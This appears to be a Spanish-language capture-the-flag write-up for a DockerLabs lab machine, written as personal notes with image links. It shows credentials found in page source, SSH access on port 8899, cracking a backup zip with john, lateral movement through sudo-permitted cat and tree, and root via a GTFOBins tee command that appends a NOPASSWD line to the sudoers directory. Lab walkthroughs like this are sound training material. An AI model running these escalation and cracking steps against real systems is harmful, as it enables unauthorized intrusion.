nmap: 80, 8899
![image](https://github.com/user-attachments/assets/3640f876-af5a-4520-8312-e1baa9297e3c)


---

en la pagina principal da un usuario "rosa" y posibles contraseñas en texto plano txt y un sha384:
![[dockerlabs/medio/bashpariencias/pagina principal 1.png]]

      -UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1
los pasamos por un sha384: https://emn178.github.io/online-tools/sha384.html

y nos da: 

>e762c3709721038d65fa8365bbd50e88fd5515f56ee41c64e157607793d1bc8ce2ffd67a6e93431008b0cce67fa70c57

si voy a formulario de la pagina principal y voy al código fuente encontramos esto:
![[dockerlabs/medio/bashpariencias/codigo fuente.png]]
"rosa:lacagadenuevo" (posible contraseña)
probamos:

     - ssh rosa@172.18.0.2 -p 8899 (porque el puerto 22 esta cerrado)

vemos que podemos entrar:
![[dockerlabs/medio/bashpariencias/conexion1.png]]

encontré esto:
![[encuentro1.png]]

dentro vamos a la carpeta: cd > cd ./- > abrimos un servidor y en nuestro terminal un curl:

     curl http://172.18.0.2:8080/backup_rosa.zip --output rosa.zip

nos pasamos el zip
![[dockerlabs/medio/bashpariencias/paso1.png]]

nos pide una contraseña así que intentamos un "john"

         zip2john rosa.zip > hash_zip
          john hash_zip

y nos da la contraseña:
![[dockerlabs/medio/bashpariencias/contraseña1.png]]
ingresamos a la terminal victima y con al contraseña vemos lo que dice en "password.txt"
contraseña: hackwhitbash
![[contraseña2.png]]
probamos con "juan" y ahora somos el usuario "juan"
con sudo -l  vemos que carlos ejecuta "tree / cat" 
colocamos:

    sudo -u carlos tree /home/carlos

da que tenemos un directorio con nombre "password" hacemos un
    
    sudo -u carlos cat /home/carlos/password

nos da la contraseña de carlos: chocolateado
![[contraseña3.png]]


con sudo -l  y carlos ejecuta un "tee"
buscamos en: https://gtfobins.github.io/gtfobins/tee/
y seguimos los pasos:

    LFILE=/etc/sudoers.d/carlos
     echo "carlos ALL=(ALL) NOPASSWD: ALL" | sudo tee -a "$LFILE"

ejecutamos "sudo su"
![[dockerlabs/medio/bashpariencias/root.png]]
 y somos root!.
